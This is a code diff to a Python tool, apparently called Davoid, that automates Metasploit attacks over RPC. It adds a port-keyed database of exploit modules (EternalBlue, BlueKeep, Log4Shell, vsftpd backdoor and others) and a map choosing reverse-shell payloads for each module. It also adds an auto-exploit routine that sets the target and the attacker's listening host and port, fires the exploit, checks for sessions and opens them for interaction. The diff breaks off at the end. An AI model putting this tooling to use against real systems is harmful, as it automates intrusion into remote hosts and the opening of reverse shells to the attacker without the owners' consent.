@@ -21,6 +21,322 @@ except ImportError:
 console = Console()
 
 
+# ──────────────────────────────────────────────
+#  MASTER EXPLOIT DATABASE
+#  Keyed by port → list of modules ordered by
+#  reliability (best first)
+# ──────────────────────────────────────────────
+PORT_EXPLOIT_DB = {
+    # ── FTP ──────────────────────────────────
+    21: [
+        "unix/ftp/vsftpd_234_backdoor",
+        "unix/ftp/proftpd_modcopy_exec",
+        "unix/ftp/proftpd_133c_backdoor",
+        "multi/ftp/wuftpd_site_exec_format_string",
+    ],
+    # ── SSH ──────────────────────────────────
+    22: [
+        "linux/ssh/sshexec",
+        "linux/ssh/libssh_auth_bypass",
+        "multi/ssh/sshkey_persistence",
+    ],
+    # ── TELNET ───────────────────────────────
+    23: [
+        "unix/telnet/telnet_login",
+        "linux/telnet/netgear_telnetenable",
+    ],
+    # ── SMTP ─────────────────────────────────
+    25: [
+        "unix/smtp/exim4_string_format",
+        "unix/smtp/haraka_attachment",
+        "linux/smtp/exim_pe_injection",
+        "unix/smtp/sendmail_exec",
+    ],
+    # ── DNS ──────────────────────────────────
+    53: [
+        "windows/dns/ms09_008_win_dns_ptr",
+    ],
+    # ── HTTP ─────────────────────────────────
+    80: [
+        "multi/http/apache_normalize_path_rce",
+        "multi/http/struts2_content_type_ognl",
+        "multi/http/jenkins_script_console",
+        "multi/http/tomcat_mgr_upload",
+        "multi/http/wp_admin_shell_upload",
+        "multi/http/drupalgeddon2",
+        "multi/http/joomla_http_header_rce",
+        "multi/http/php_cgi_arg_injection",
+        "multi/http/webmin_backdoor",
+        "multi/http/log4shell_header_injection",
+        "multi/http/spring4shell_rce",
+        "multi/http/shellshock_header_inject",
+    ],
+    # ── POP3 ─────────────────────────────────
+    110: [
+        "linux/pop3/dovecot_flag_command_injection",
+    ],
+    # ── IDENT ────────────────────────────────
+    113: [
+        "unix/misc/distcc_exec",   # sometimes mapped to 113 on CTF boxes
+    ],
+    # ── IMAP ─────────────────────────────────
+    143: [
+        "linux/imap/cyrus_imapd_listmailbox",
+    ],
+    # ── SNMP ─────────────────────────────────
+    161: [
+        "linux/snmp/net_snmpd_rw_community",
+    ],
+    # ── LDAP ─────────────────────────────────
+    389: [
+        "linux/ldap/openldap_slapd_modrdn",
+    ],
+    # ── HTTPS ────────────────────────────────
+    443: [
+        "multi/http/apache_normalize_path_rce",
+        "multi/http/struts2_content_type_ognl",
+        "multi/ssl/openssl_heartbleed",
+        "multi/http/log4shell_header_injection",
+    ],
+    # ── SMB ──────────────────────────────────
+    445: [
+        "windows/smb/ms17_010_eternalblue",
+        "windows/smb/ms17_010_psexec",
+        "windows/smb/ms08_067_netapi",
+        "windows/smb/ms06_040_netapi",
+        "windows/smb/ms10_061_spoolss",
+        "windows/smb/psexec",
+        "linux/samba/is_known_pipename",
+        "multi/samba/usermap_script",
+    ],
+    # ── MSSQL ────────────────────────────────
+    1433: [
+        "windows/mssql/mssql_exec",
+        "windows/mssql/mssql_payload",
+        "windows/mssql/mssql_clr_payload",
+    ],
+    # ── ORACLE ───────────────────────────────
+    1521: [
+        "windows/oracle/oracle_login",
+        "windows/oracle/tns_auth_sesskey",
+    ],
+    # ── NFS ──────────────────────────────────
+    2049: [
+        "linux/nfs/nfsd_write",
+    ],
+    # ── MySQL ────────────────────────────────
+    3306: [
+        "linux/mysql/mysql_yassl_getali",
+        "multi/mysql/mysql_udf_payload",
+        "linux/mysql/mysql_secure_moo",
+    ],
+    # ── RDP ──────────────────────────────────
+    3389: [
+        "windows/rdp/cve_2019_0708_bluekeep_rce",
+        "windows/rdp/ms12_020_maxchannelids",
+    ],
+    # ── POSTGRESQL ───────────────────────────
+    5432: [
+        "linux/postgres/postgres_payload",
+        "multi/postgres/postgres_copy_from_program_cmd_exec",
+    ],
+    # ── VNC ──────────────────────────────────
+    5900: [
+        "multi/vnc/vnc_keyboard_exec",
+        "windows/vnc/ultravnc_client",
+    ],
+    5901: [
+        "multi/vnc/vnc_keyboard_exec",
+    ],
+    # ── REDIS ────────────────────────────────
+    6379: [
+        "linux/redis/redis_replication_cmd_exec",
+        "linux/redis/redis_unauth_exec",
+    ],
+    # ── DISTCC ───────────────────────────────
+    6200: [
+        "unix/misc/distcc_exec",
+    ],
+    # ── CouchDB ──────────────────────────────
+    5984: [
+        "linux/http/couchdb_cmd_injection",
+    ],
+    # ── Tomcat / HTTP-ALT ────────────────────
+    8080: [
+        "multi/http/tomcat_mgr_upload",
+        "multi/http/tomcat_mgr_deploy",
+        "multi/http/jenkins_script_console",
+        "multi/http/apache_normalize_path_rce",
+        "multi/http/log4shell_header_injection",
+    ],
+    8443: [
+        "multi/http/log4shell_header_injection",
+        "multi/http/spring4shell_rce",
+    ],
+    8888: [
+        "multi/http/jupyter_magics_exec",
+    ],
+    # ── Elasticsearch ────────────────────────
+    9200: [
+        "multi/elasticsearch/search_groovy_script_code_execution",
+    ],
+    9300: [
+        "multi/elasticsearch/search_groovy_script_code_execution",
+    ],
+    # ── Mongo ────────────────────────────────
+    27017: [
+        "linux/mongodb/mongodb_unauth_exec",
+    ],
+    # ── IRC ──────────────────────────────────
+    6667: [
+        "unix/irc/unreal_ircd_3281_backdoor",
+    ],
+    # ── JAVA RMI ─────────────────────────────
+    1099: [
+        "multi/misc/java_rmi_server",
+    ],
+    # ── Java RMI / JMX ───────────────────────
+    9999: [
+        "multi/misc/java_jmx_server",
+    ],
+    # ── Webmin ───────────────────────────────
+    10000: [
+        "multi/http/webmin_backdoor",
+        "multi/http/webmin_file_disclosure",
+    ],
+    # ── Ajp Tomcat ───────────────────────────
+    8009: [
+        "multi/http/apache_mod_jk_overflow",
+    ],
+    # ── Docker API ───────────────────────────
+    2375: [
+        "linux/http/docker_daemon_tcp",
+    ],
+    2376: [
+        "linux/http/docker_daemon_tcp",
+    ],
+    # ── Kubernetes API ───────────────────────
+    6443: [
+        "multi/http/kubernetes_exec",
+    ],
+    # ── memcached ────────────────────────────
+    11211: [
+        "linux/misc/memcached_udp_dos",   # info gathering / DoS only, but useful
+    ],
+    # ── HTTP-proxy / Squid ───────────────────
+    3128: [
+        "multi/http/squid_cache_manager",
+    ],
+    # ── HP Data Protector ────────────────────
+    5555: [
+        "windows/misc/hp_dataprotector_exec_bar",
+    ],
+    # ── NTP ──────────────────────────────────
+    123: [
+        "linux/misc/ntp_monlist_dos",
+    ],
+    # ── CUPS ─────────────────────────────────
+    631: [
+        "unix/misc/cups_bash_env_exec",
+    ],
+    # ── WinRM ────────────────────────────────
+    5985: [
+        "windows/winrm/winrm_script_exec",
+    ],
+    5986: [
+        "windows/winrm/winrm_script_exec",
+    ],
+    # ── HTTP Alt ─────────────────────────────
+    7777: [
+        "multi/http/axis2_deployer",
+    ],
+    # ── Jetty ────────────────────────────────
+    8181: [
+        "multi/http/jetty_ajpbug_fileread",
+    ],
+    # ── WebLogic ─────────────────────────────
+    7001: [
+        "multi/misc/weblogic_deserialize_asyncresponseservice",
+        "multi/misc/weblogic_deserialize_badattrval",
+    ],
+    7002: [
+        "multi/misc/weblogic_deserialize_asyncresponseservice",
+    ],
+    # ── Splunk ───────────────────────────────
+    8089: [
+        "multi/http/splunk_upload_app_exec",
+    ],
+    # ── GitLab / Gogs ────────────────────────
+    3000: [
+        "multi/http/gogs_exec",
+        "multi/http/gitlab_exif_rce",
+    ],
+    # ── RabbitMQ ─────────────────────────────
+    15672: [
+        "multi/http/rabbitmq_management_exec",
+    ],
+    # ── X11 ──────────────────────────────────
+    6000: [
+        "unix/x11/open_x11",
+    ],
+    # ── Rsync ────────────────────────────────
+    873: [
+        "linux/misc/rsync_exec",
+    ],
+    # ── Finger ───────────────────────────────
+    79: [
+        "unix/misc/finger_backdoor",
+    ],
+}
+
+# ──────────────────────────────────────────────
+#  SMART PAYLOAD MAP
+#  keyed by platform keyword found in module path
+# ──────────────────────────────────────────────
+PAYLOAD_MAP = {
+    "windows": "windows/x64/meterpreter/reverse_tcp",
+    "osx":     "osx/x64/meterpreter_reverse_tcp",
+    "apple":   "osx/x64/meterpreter_reverse_tcp",
+    "linux":   "linux/x86/meterpreter/reverse_tcp",
+    "unix":    "cmd/unix/interact",
+    "multi":   "linux/x86/meterpreter/reverse_tcp",
+    "java":    "java/jsp_shell_reverse_tcp",
+    "php":     "php/meterpreter/reverse_tcp",
+    "android": "android/meterpreter/reverse_tcp",
+}
+
+# Fine-grained overrides (checked first, substring match)
+PAYLOAD_OVERRIDES = {
+    "samba":        "cmd/unix/reverse_netcat",
+    "vsftpd":       "cmd/unix/interact",
+    "ircd":         "cmd/unix/interact",
+    "distcc":       "cmd/unix/interact",
+    "usermap":      "cmd/unix/reverse_netcat",
+    "pe_injection": "windows/x64/meterpreter/reverse_tcp",
+    "bluekeep":     "windows/x64/meterpreter/reverse_tcp",
+    "eternalblue":  "windows/x64/meterpreter/reverse_tcp",
+    "postgres":     "linux/x86/meterpreter/reverse_tcp",
+    "mysql":        "linux/x86/meterpreter/reverse_tcp",
+    "redis":        "linux/x86/meterpreter/reverse_tcp",
+    "x11":          "cmd/unix/interact",
+    "rsync":        "cmd/unix/interact",
+    "telnet":       "cmd/unix/interact",
+    "log4shell":    "linux/x86/meterpreter/reverse_tcp",
+}
+
+
+def smart_payload(module_path: str) -> str:
+    """Returns the best-guess payload string for a given module path."""
+    m = module_path.lower()
+    for key, payload in PAYLOAD_OVERRIDES.items():
+        if key in m:
+            return payload
+    for key, payload in PAYLOAD_MAP.items():
+        if key in m:
+            return payload
+    return "linux/x86/meterpreter/reverse_tcp"   # safest generic fallback
+
+
 class MetasploitRPCEngine:
     def __init__(self):
         self.client = None
@@ -30,93 +346,102 @@ class MetasploitRPCEngine:
         self.rpc_port = 55554
         self.msfrpcd_path = self.find_msfrpcd()
 
-    def find_msfrpcd(self):
-        """Locates the msfrpcd executable on the system, bypassing sudo PATH issues."""
-        common_paths = [
-            "/opt/metasploit-framework/bin/msfrpcd",  # Official installer
-            "/opt/homebrew/bin/msfrpcd",              # Apple Silicon Mac
-            "/usr/local/bin/msfrpcd",                 # Intel Mac
-            "/usr/bin/msfrpcd"                        # Kali Linux default
-        ]
+    # ── Utility ──────────────────────────────────────────────────────────────
 
+    def find_msfrpcd(self):
+        """Locates msfrpcd, bypassing sudo PATH issues."""
+        common_paths = [
+            "/opt/metasploit-framework/bin/msfrpcd",
+            "/opt/homebrew/bin/msfrpcd",
+            "/usr/local/bin/msfrpcd",
+            "/usr/bin/msfrpcd",
+        ]
         try:
             path = subprocess.run(
-                ['which', 'msfrpcd'], capture_output=True, text=True).stdout.strip()
-            if os.path.exists(path):
+                ['which', 'msfrpcd'], capture_output=True, text=True
+            ).stdout.strip()
+            if path and os.path.exists(path):
                 return path
-        except:
+        except Exception:
             pass
-
         for p in common_paths:
             if os.path.exists(p):
                 return p
-
         return None
 
     def check_dependencies(self):
         try:
-            import pymetasploit3
+            import pymetasploit3  # noqa: F401
         except ImportError:
             console.print(
                 "[bold red][!] Critical Dependency Missing: 'pymetasploit3'[/bold red]")
+            console.print(
+                "[yellow]    Run: pip install pymetasploit3[/yellow]")
             return False
-
         if not self.msfrpcd_path:
             console.print(
-                "[bold red][!] Metasploit Framework ('msfrpcd') not found on this system![/bold red]")
+                "[bold red][!] Metasploit Framework ('msfrpcd') not found![/bold red]")
             console.print(
-                "[yellow]Please ensure Metasploit is installed and accessible.[/yellow]")
+                "[yellow]    Ensure Metasploit is installed and in PATH.[/yellow]")
             return False
-
         return True
 
     def is_port_open(self, port):
-        """Checks if a local port is listening."""
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(1)
             return s.connect_ex(('127.0.0.1', port)) == 0
 
     def kill_stuck_daemon(self):
-        """Cross-platform method to forcefully free the RPC port."""
-        if sys.platform == "darwin":  # macOS
+        if sys.platform == "darwin":
             os.system(
                 f"lsof -ti:{self.rpc_port} | xargs kill -9 > /dev/null 2>&1")
-        else:  # Linux
+        else:
             os.system(f"fuser -k {self.rpc_port}/tcp > /dev/null 2>&1")
 
+    # ── Daemon lifecycle ─────────────────────────────────────────────────────
+
     def start_daemon(self):
-        """Silently boots the Metasploit RPC server in the background."""
+        """Silently boots the MSF RPC server in the background."""
         if self.is_port_open(self.rpc_port):
             self.kill_stuck_daemon()
             time.sleep(1)
 
-        with console.status("[bold cyan]Booting Headless Metasploit Engine (This takes ~10-15 seconds)...[/bold cyan]", spinner="bouncingBar"):
-            cmd = [self.msfrpcd_path, "-P", self.password, "-n",
-                   "-f", "-a", "127.0.0.1", "-p", str(self.rpc_port)]
+        with console.status(
+            "[bold cyan]Booting Headless Metasploit Engine (~10-15s)...[/bold cyan]",
+            spinner="bouncingBar"
+        ):
+            cmd = [
+                self.msfrpcd_path,
+                "-P", self.password,
+                "-n", "-f",
+                "-a", "127.0.0.1",
+                "-p", str(self.rpc_port),
+            ]
             self.daemon_process = subprocess.Popen(
                 cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-            for _ in range(40):
+            for _ in range(45):
                 if self.is_port_open(self.rpc_port):
                     time.sleep(3)
                     return True
                 time.sleep(1)
-
         return False
 
     def connect_rpc(self):
-        """Connects Davoid to the newly spawned MSF Daemon."""
         if self.client:
             return True
-
         if not self.start_daemon():
             console.print(
-                "[bold red][!] Failed to boot Metasploit Daemon. Ensure Metasploit is installed correctly.[/bold red]")
+                "[bold red][!] Failed to boot Metasploit Daemon.[/bold red]")
             return False
-
         console.print("[*] Negotiating API connection...")
         try:
             self.client = MsfRpcClient(
-                self.password, server='127.0.0.1', port=self.rpc_port, ssl=True)
+                self.password,
+                server='127.0.0.1',
+                port=self.rpc_port,
+                ssl=True,
+            )
             console.print(
                 "[bold green][+] MSF-RPC Authenticated Successfully![/bold green]")
             time.sleep(1)
@@ -126,44 +451,61 @@ class MetasploitRPCEngine:
                 f"[bold red][!] RPC Connection Failed:[/bold red] {e}")
             return False
 
+    # ── Helpers ──────────────────────────────────────────────────────────────
+
+    def _poll_console(self, msf_console, max_iterations=20, sleep=1.0):
+        """Poll an MSF console until it is no longer busy and return all output."""
+        raw = ""
+        for _ in range(max_iterations):
+            time.sleep(sleep)
+            out = msf_console.read()
+            if out and out.get('data'):
+                raw += out['data']
+            if out and out.get('busy') is False:
+                break
+        return raw
+
+    def _fresh_console(self):
+        return self.client.consoles.console()
+
+    # ── Search ───────────────────────────────────────────────────────────────
+
     def search_modules(self):
-        """Pro Feature: Search Metasploit database from within Davoid."""
         keyword = questionary.text(
-            "Enter search keyword (e.g., vsftpd, eternalblue, smb):", style=Q_STYLE).ask()
+            "Enter search keyword (e.g., vsftpd, eternalblue, smb):",
+            style=Q_STYLE
+        ).ask()
         if not keyword:
             return
 
-        with console.status(f"[bold cyan]Querying Metasploit Database for '{keyword}'...[/bold cyan]", spinner="dots"):
+        with console.status(
+            f"[bold cyan]Querying Metasploit Database for '{keyword}'...[/bold cyan]",
+            spinner="dots"
+        ):
             try:
-                msf_console = self.client.consoles.console()
+                msf_console = self._fresh_console()
                 msf_console.write(f"search {keyword}\n")
-
-                raw_data = ""
-                # Smart sync: Wait until the MSF console reports it is no longer busy
-                for _ in range(20):
-                    time.sleep(1)
-                    out = msf_console.read()
-                    if out and out.get('data'):
-                        raw_data += out['data']
-                    if out and out.get('busy') is False:
-                        break
+                raw_data = self._poll_console(msf_console, max_iterations=25)
 
                 if raw_data:
                     lines = raw_data.split('\n')
-                    if len(lines) > 50:
-                        raw_data = '\n'.join(
-                            lines[:50]) + "\n\n... [Truncated for readability. Be more specific.]"
-
-                    console.print(
-                        Panel(raw_data, title=f"Search Results: {keyword}", border_style="cyan"))
+                    if len(lines) > 60:
+                        raw_data = '\n'.join(lines[:60]) + \
+                            "\n\n[dim]... Truncated. Use a more specific keyword.[/dim]"
+                    console.print(Panel(
+                        raw_data,
+                        title=f"Search Results: {keyword}",
+                        border_style="cyan"
+                    ))
                 else:
                     console.print(
                         "[yellow][!] No modules found or search timed out.[/yellow]")
             except Exception as e:
                 console.print(f"[red][!] Search failed: {e}[/red]")
 
+    # ── Auto-Exploit ─────────────────────────────────────────────────────────
+
     def auto_exploit(self):
-        """Pro Tier: Dynamically queries the MSF DB based on the port and auto-suggests the highest-ranked exploits."""
         default_rhost = ctx.get("RHOST") or "192.168.1.1"
         default_lhost = ctx.get("LHOST") or "127.0.0.1"
 
@@ -174,156 +516,151 @@ class MetasploitRPCEngine:
 
         rport_input = questionary.text(
             "Target Port (RPORT):", style=Q_STYLE).ask()
-        if not rport_input:
+        if not rport_input or not rport_input.strip().isdigit():
+            console.print("[red][!] Invalid port.[/red]")
             return
-        rport = int(rport_input)
+        rport = int(rport_input.strip())
 
         lhost = questionary.text(
             "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()
+        if not lhost:
+            return
 
-        # Extensive Best-in-Class Fallback Dictionary for standard ports
-        port_exploits = {
-            21: "unix/ftp/vsftpd_234_backdoor",
-            22: "linux/ssh/exim_pe_injection",
-            23: "unix/telnet/telnet_login",
-            25: "unix/smtp/exim4_string_format",
-            80: "multi/http/apache_normalize_path_rce",
-            139: "multi/samba/usermap_script",
-            445: "windows/smb/ms17_010_eternalblue",
-            3306: "linux/mysql/mysql_yassl_getali",
-            3389: "windows/rdp/cve_2019_0708_bluekeep_rce",
-            6200: "unix/misc/distcc_exec",
-            8080: "multi/http/tomcat_mgr_upload"
-        }
+        lport_input = questionary.text(
+            "Your listening port (LPORT):", default="4444", style=Q_STYLE).ask()
+        lport = lport_input.strip() if lport_input else "4444"
 
-        # --- PRO FEATURE: Dynamic Intelligence Engine & Ranking ---
-        parsed_modules = []
-        raw_data = ""
+        # ── Step 1: Build candidate list from static DB ──
+        static_candidates = PORT_EXPLOIT_DB.get(rport, [])
+
+        # ── Step 2: Dynamic MSF DB query ─────────────────
         rank_scores = {
             "excellent": 7, "great": 6, "good": 5,
-            "normal": 4, "average": 3, "low": 2, "manual": 1
+            "normal": 4, "average": 3, "low": 2, "manual": 1,
         }
+        parsed_modules = []
+        raw_data = ""
 
         try:
-            msf_console = self.client.consoles.console()
+            msf_console = self._fresh_console()
             msf_console.write(f"search port:{rport} type:exploit\n")
 
-            with console.status(f"[bold cyan]Querying Database & Ranking Exploits for Port {rport}...[/bold cyan]", spinner="dots"):
-                # Smart Sync: Poll until MSF finishes the database query
-                for _ in range(20):
-                    time.sleep(1)
-                    out = msf_console.read()
-                    if out and out.get('data'):
-                        raw_data += out['data']
-                    if out and out.get('busy') is False:
-                        break
+            with console.status(
+                f"[bold cyan]Querying MSF DB for port {rport} exploits...[/bold cyan]",
+                spinner="dots"
+            ):
+                raw_data = self._poll_console(msf_console, max_iterations=25)
 
             if raw_data:
                 display_lines = []
                 for line in raw_data.splitlines():
-                    if "Name" in line and "Disclosure" in line:
+                    if any(x in line for x in ["Name", "----", "====", "exploit/"]):
                         display_lines.append(line)
-                    elif "----" in line or "====" in line:
-                        display_lines.append(line)
-                    elif "exploit/" in line:
-                        display_lines.append(line)
-
-                        # Extract the exact path and its rank
+                    if "exploit/" in line:
                         parts = line.split()
                         mod_path = next(
                             (p for p in parts if p.startswith("exploit/")), None)
-                        rank = next((r for r in rank_scores.keys()
-                                    if r in line.lower()), "normal")
-
+                        rank = next(
+                            (r for r in rank_scores if r in line.lower()), "normal")
                         if mod_path:
-                            # Strip 'exploit/' prefix to ensure flawless execution in older MSF versions
                             clean_path = mod_path.replace("exploit/", "", 1)
                             parsed_modules.append({
                                 'path': clean_path,
                                 'rank': rank,
-                                'score': rank_scores[rank]
+                                'score': rank_scores[rank],
                             })
 
-                if parsed_modules:
-                    console.print(Panel("\n".join(
-                        display_lines[:25]), title=f"Top Vulnerabilities for Port {rport}", border_style="green"))
-                    if len(display_lines) > 25:
-                        console.print(
-                            "[dim]... [Truncated. Showing top results only] ...[/dim]")
-                else:
-                    console.print(
-                        f"[yellow][-] No direct port-matched exploits found for {rport} in the MSF Database.[/yellow]")
+                if display_lines:
+                    console.print(Panel(
+                        "\n".join(display_lines[:30]),
+                        title=f"Live MSF DB Results — Port {rport}",
+                        border_style="green"
+                    ))
         except Exception as e:
-            console.print(f"[dim red]Module search error: {e}[/dim red]")
+            console.print(f"[dim red]Module query error: {e}[/dim red]")
 
-        # --- SMART DROPDOWN SELECTION (Sorted by Reliability) ---
+        # ── Step 3: Merge & deduplicate ───────────────────
+        # Dynamic results first (sorted by rank), then static fallbacks
+        parsed_modules.sort(key=lambda x: x['score'], reverse=True)
+        dynamic_paths = [m['path'] for m in parsed_modules]
+
+        # Add static DB entries that aren't already in dynamic results
+        merged = list(dynamic_paths)
+        for s in static_candidates:
+            if s not in merged:
+                merged.append(s)
+
+        # ── Step 4: Module selection ──────────────────────
         custom_mod = ""
-        fallback_mod = port_exploits.get(rport, "")
 
-        if parsed_modules:
-            # Sort the discovered modules by their Rank Score (Highest to lowest)
-            parsed_modules.sort(key=lambda x: x['score'], reverse=True)
-
-            choices = [
-                f"[{m['rank'].upper()}] {m['path']}" for m in parsed_modules[:15]]
+        if merged:
+            choices = []
+            for path in merged[:20]:
+                # Find rank label if available
+                rank_label = next(
+                    (m['rank'].upper()
+                     for m in parsed_modules if m['path'] == path),
+                    "DB"
+                )
+                choices.append(f"[{rank_label}] {path}")
             choices.append(questionary.Separator())
             choices.append("Manual Entry (Type it yourself)")
 
             selected = questionary.select(
-                "Select Exploit Module (Sorted by Reliability):",
+                f"Select Exploit Module for port {rport} (sorted by reliability):",
                 choices=choices,
                 style=Q_STYLE
             ).ask()
 
+            if not selected:
+                return
             if selected == "Manual Entry (Type it yourself)":
+                fallback = static_candidates[0] if static_candidates else ""
                 custom_mod = questionary.text(
-                    f"Enter Exploit Module (Default: {fallback_mod}):", default=fallback_mod, style=Q_STYLE).ask()
-            elif selected:
-                # Strip the "[EXCELLENT] " tag to get the pure module path
-                custom_mod = selected.split("] ")[1].strip()
+                    "Enter Exploit Module path:",
+                    default=fallback,
+                    style=Q_STYLE
+                ).ask()
+            else:
+                custom_mod = selected.split("] ", 1)[1].strip()
         else:
+            console.print(
+                f"[yellow][-] No modules in DB for port {rport}. Manual entry required.[/yellow]")
             custom_mod = questionary.text(
-                f"Enter Exploit Module manually (Default: {fallback_mod}):", default=fallback_mod, style=Q_STYLE).ask()
+                "Enter Exploit Module path:", style=Q_STYLE).ask()
 
         if not custom_mod:
             return
 
-        # --- SMART PAYLOAD GUESSER ---
-        # Automatically select the mathematically most likely payload to succeed based on the exploit string
-        default_payload = "windows/x64/meterpreter/reverse_tcp"
-        mod_lower = custom_mod.lower()
-
-        if "windows" in mod_lower:
-            default_payload = "windows/x64/meterpreter/reverse_tcp"
-        elif "linux" in mod_lower:
-            default_payload = "linux/x86/meterpreter/reverse_tcp"
-        elif "osx" in mod_lower or "apple" in mod_lower:
-            default_payload = "osx/x64/meterpreter_reverse_tcp"
-        elif any(x in mod_lower for x in ["unix", "ftp", "telnet", "vsftpd", "samba"]):
-            # Specific logic for common bind/interact shells
-            if "samba" in mod_lower:
-                default_payload = "cmd/unix/reverse_netcat"
-            else:
-                default_payload = "cmd/unix/interact"
+        # ── Step 5: Smart payload suggestion ─────────────
+        default_payload = smart_payload(custom_mod)
 
         payload_choices = [
             "windows/x64/meterpreter/reverse_tcp",
             "windows/meterpreter/reverse_tcp",
+            "windows/x64/shell_reverse_tcp",
             "linux/x64/meterpreter/reverse_tcp",
             "linux/x86/meterpreter/reverse_tcp",
+            "linux/x64/shell_reverse_tcp",
             "cmd/unix/interact",
             "cmd/unix/reverse_netcat",
+            "cmd/unix/reverse_bash",
             "php/meterpreter/reverse_tcp",
             "java/jsp_shell_reverse_tcp",
+            "android/meterpreter/reverse_tcp",
             "osx/x64/meterpreter_reverse_tcp",
             questionary.Separator(),
-            "Custom (Type it manually)"
+            "Custom (Type it manually)",
         ]
 
+        # Make sure the default appears in the list
+        if default_payload not in payload_choices:
+            payload_choices.insert(0, default_payload)
+
         custom_payload = questionary.select(
-            f"Select Payload (Auto-Suggested for {custom_mod.split('/')[0]}):",
+            f"Select Payload (auto-suggested: {default_payload}):",
             choices=payload_choices,
-            default=default_payload if default_payload in payload_choices else None,
+            default=default_payload,
             style=Q_STYLE
         ).ask()
 
@@ -334,23 +671,31 @@ class MetasploitRPCEngine:
         if not custom_payload:
             return
 
+        # ── Step 6: Execute ───────────────────────────────
         console.print(Panel(
-            f"[bold cyan]Deploying Exploit via Virtual Console API...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {custom_mod}\n[white]Payload:[/white] {custom_payload}", border_style="red"))
+            f"[bold cyan]Deploying Exploit...[/bold cyan]\n"
+            f"[white]Target  :[/white] {target}:{rport}\n"
+            f"[white]Module  :[/white] {custom_mod}\n"
+            f"[white]Payload :[/white] {custom_payload}\n"
+            f"[white]LHOST   :[/white] {lhost}:{lport}",
+            border_style="red"
+        ))
 
         try:
-            msf_console = self.client.consoles.console()
+            msf_console = self._fresh_console()
             msf_console.write(f"use {custom_mod}\n")
             time.sleep(0.5)
 
-            # Use SETG (Set Global) to silently force variables into the MSF memory space.
             msf_console.write(f"setg RHOSTS {target}\n")
             msf_console.write(f"setg RHOST {target}\n")
             msf_console.write(f"setg RPORT {rport}\n")
             msf_console.write(f"setg LHOST {lhost}\n")
-            msf_console.write(f"setg LPORT 4444\n")
+            msf_console.write(f"setg LPORT {lport}\n")
             msf_console.write(f"set PAYLOAD {custom_payload}\n")
 
-            if "local" in custom_mod or "pe_injection" in custom_mod:
+            # ── Local priv-esc: ask for session ID ────────
+            mod_lower = custom_mod.lower()
+            if any(k in mod_lower for k in ["local", "pe_injection", "priv"]):
                 console.print(
                     "\n[yellow][!] This appears to be a Local Privilege Escalation exploit.[/yellow]")
                 sess_id = questionary.text(
@@ -359,49 +704,59 @@ class MetasploitRPCEngine:
                     msf_console.write(f"set SESSION {sess_id}\n")
 
             msf_console.write("exploit -j -z\n")
-
             db.log("MSF-Engine", target,
                    f"Attempted {custom_mod} via Console", "INFO")
 
             console_output = ""
-            with console.status("[bold cyan]Executing and capturing MSF output...[/bold cyan]", spinner="dots"):
-                # Poll for up to 15 seconds (10 iterations * 1.5s)
-                for _ in range(10):
+            with console.status(
+                "[bold cyan]Executing — capturing MSF output...[/bold cyan]",
+                spinner="dots"
+            ):
+                stop_tokens = [
+                    "Exploit completed", "session", "failed",
+                    "Command shell", "found", "error", "Handler"
+                ]
+                for _ in range(15):
                     time.sleep(1.5)
                     out = msf_console.read()
                     if out and out.get('data'):
                         console_output += out['data']
-                        if any(x in out['data'] for x in ["Exploit completed", "session", "failed", "Command shell", "found"]):
+                        if any(t.lower() in out['data'].lower() for t in stop_tokens):
                             break
 
             if console_output.strip():
                 console.print(f"\n[dim]{console_output.strip()}[/dim]")
 
-            with console.status("[bold cyan]Verifying session status...[/bold cyan]", spinner="bouncingBar"):
+            # ── Session verification ──────────────────────
+            with console.status(
+                "[bold cyan]Verifying session status...[/bold cyan]",
+                spinner="bouncingBar"
+            ):
                 session_found = False
-                for _ in range(4):
+                for _ in range(5):
                     time.sleep(2)
                     sessions = self.client.sessions.list
                     if sessions:
                         console.print(
-                            f"\n[bold green][+] Success! {len(sessions)} session(s) active. Use Option 4 to interact.[/bold green]")
+                            f"\n[bold green][+] Success! {len(sessions)} session(s) active. "
+                            f"Use 'Active Sessions' to interact.[/bold green]")
                         db.log("MSF-Engine", target,
                                f"Successful Exploit: {custom_mod}", "CRITICAL")
                         session_found = True
                         break
-
                 if not session_found:
                     console.print(
-                        "\n[yellow][-] No session established yet. The exploit may have failed, the target isn't vulnerable, or it needs more time.[/yellow]")
+                        "\n[yellow][-] No session yet. Exploit may have failed, "
+                        "target may not be vulnerable, or it needs more time.[/yellow]")
 
         except Exception as e:
             console.print(
                 f"[bold red][!] Exploit execution failed:[/bold red] {e}")
 
-    def list_sessions(self):
-        """Pulls live session data from the Metasploit Daemon."""
-        sessions = self.client.sessions.list
+    # ── Sessions ─────────────────────────────────────────────────────────────
 
+    def list_sessions(self):
+        sessions = self.client.sessions.list
         if not sessions:
             console.print("[yellow][!] No active MSF sessions found.[/yellow]")
             return False
@@ -418,47 +773,19 @@ class MetasploitRPCEngine:
                 str(session_id),
                 data.get('type', 'Unknown'),
                 data.get('target_host', 'Unknown'),
-                data.get('info', 'No Info')
+                data.get('info', 'No Info'),
             )
-
         console.print(table)
         return True
 
-    def manage_jobs(self):
-        """Pro Feature: Background Job Manager"""
-        jobs = self.client.jobs.list
-        if not jobs:
-            console.print("[yellow][!] No background jobs running.[/yellow]")
-            return
-
-        table = Table(title="Active MSF Background Jobs",
-                      border_style="blue", expand=True)
-        table.add_column("Job ID", style="cyan", justify="center")
-        table.add_column("Job Name", style="white")
-
-        for jid, jname in jobs.items():
-            table.add_row(str(jid), jname)
-
-        console.print(table)
-
-        target_job = questionary.text(
-            "Enter Job ID to kill (or leave blank to cancel):", style=Q_STYLE).ask()
-        if target_job and target_job in jobs:
-            try:
-                self.client.jobs.stop(target_job)
-                console.print(
-                    f"[bold green][+] Job {target_job} terminated successfully.[/bold green]")
-            except Exception as e:
-                console.print(f"[red][!] Failed to kill job: {e}[/red]")
-
     def interact_session(self):
-        """Opens an interactive terminal to an active Metasploit session."""
         if not self.list_sessions():
             return
 
         session_id = questionary.text(
-            "Enter Session ID to interact with (or leave blank to cancel):", style=Q_STYLE).ask()
-
+            "Enter Session ID to interact with (blank to cancel):",
+            style=Q_STYLE
+        ).ask()
         if not session_id:
             return
 
@@ -470,14 +797,16 @@ class MetasploitRPCEngine:
         session_type = sessions[session_id].get('type', 'Unknown')
         shell = self.client.sessions.session(session_id)
 
-        # Pro Feature: Automated Post-Exploitation Quick Actions
         if session_type == 'meterpreter':
             quick_action = questionary.select(
